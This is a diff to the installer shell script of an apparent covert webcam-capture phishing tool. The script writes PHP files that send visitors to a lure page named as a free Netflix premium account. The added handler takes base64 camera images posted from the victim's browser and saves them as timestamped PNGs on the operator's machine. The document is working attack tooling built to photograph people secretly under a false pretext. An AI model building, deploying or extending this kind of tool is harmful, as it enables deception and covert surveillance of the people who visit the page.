@@ -74,6 +74,27 @@ fi
 # Create Files
 printf "<?php\ninclude '.camdata.php';\nheader('Location: .NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/.hiddencam.php
 
+printf """
+<?php
+
+$date = date('i_s_H-dMY');
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" . "\r\n", 3, ".cam.log");
+
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( '~/hiddencam/images/HiddenCam-'.$date.'.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?>
+""" > .htrtech.php
+
 printf " \n"
 printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Installation Completed ...\e[0m\n"
 printf " \n"
